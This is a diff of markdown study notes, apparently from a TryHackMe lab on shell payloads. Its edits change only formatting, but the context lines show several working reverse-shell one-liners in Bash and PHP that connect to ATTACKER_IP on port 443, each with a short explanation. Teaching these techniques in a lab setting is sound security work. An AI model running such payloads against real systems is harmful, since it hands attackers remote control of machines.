@@ -161,22 +161,19 @@ A Shell Payload can be a command or script that exposes the shell to an incoming
 
 Let's explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular **reverse shell**.  
 
-#### Bash
+## ==`Bash`==
 
 **Normal Bash Reverse Shell**
 ```shell-session
 target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
 ```
-
 This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (**ATTACKER_IP**) on port `443`. The `>&` operator combines both standard output and standard error.
 
-  
 
 **Bash Read Line** **Reverse Shell**
 ```shell-session
 target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
 ```
-
 This reverse shell creates a new file descriptor (`5` in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.
 
 
@@ -184,7 +181,6 @@ This reverse shell creates a new file descriptor (`5` in this case)  and conn
 ```shell-session
 target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
 ```
-
 This reverse shell uses a file descriptor (`196` in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.
 
   
@@ -193,28 +189,23 @@ This reverse shell uses a file descriptor (`196` in this case) to establish a 
 ```shell-session
 target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 ```
-
 Similar to the first example, this command opens a shell (`bash -i`), but it uses file descriptor `5` for input and output, enabling an interactive session over the TCP connection.
 
-#### PHP
+## ==`PHP`==
 
 **PHP Reverse Shell Using the exec Function**
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
 ```
-
 This reverse shell creates a socket connection to the attacker's IP on port `443` and uses the `exec` function to execute a shell, redirecting standard input and output.
 
-  
 
 **PHP Reverse Shell Using the shell_exec Function**
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
 ```
-
 Similar to the previous command, but uses the `shell_exec` function.
 
-  
 
 **PHP Reverse Shell Using the system Function**
 ```shell-session
